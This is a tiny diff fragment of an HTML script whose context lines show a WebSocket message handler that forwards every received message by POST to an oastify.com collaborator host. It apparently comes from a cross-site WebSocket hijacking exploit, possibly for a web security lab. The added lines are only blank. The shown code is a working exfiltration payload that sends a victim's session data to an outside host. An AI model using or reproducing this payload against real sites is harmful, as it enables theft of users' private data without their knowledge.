@@ -6,4 +6,7 @@
     ws.onmessage = function(event) {
         fetch('https://el3uxfz4xdx638s3z594hkvw3n9ex4lt.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
     };
+
+
+
 </script>
